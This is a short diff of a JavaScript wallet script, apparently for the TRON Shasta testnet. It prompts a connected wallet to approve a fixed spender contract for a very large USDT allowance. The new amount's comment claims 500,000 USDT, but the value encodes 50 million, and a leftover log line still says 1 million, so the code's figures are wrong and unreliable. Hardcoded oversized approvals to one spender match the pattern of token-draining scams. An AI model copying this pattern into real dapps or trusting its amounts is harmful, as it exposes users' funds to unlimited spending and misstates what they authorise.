@@ -5,15 +5,15 @@ const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B"; // 你的合约地址
 
 // ====== 固定授权额度：100万 USDT ======
-function getOneMillionAmount() {
-  // USDT 6位小数，100万 = 1,000,000 * 1e6 = 1000000000000
-  return "1000000000000";
+function getLargeEnoughAmount() {
+  return "50000000000000";  // 50万 * 10^6
 }
+
 
 window.approveUSDT = async function() {
   try {
-    console.log("=== 授权 100万 USDT 测试 ===");
-    setStatus("准备授权 100万 USDT...");
+    console.log("=== 授权 50万 USDT 测试 ===");
+    setStatus("准备授权 50万 USDT...");
 
     if (!window.tronWeb || !window.tronWeb.ready) {
       throw new Error("请先连接钱包");
@@ -110,3 +110,4 @@ window.addEventListener("DOMContentLoaded", () => {
 });
 
 console.log("授权 100万 USDT 脚本加载完成");
+
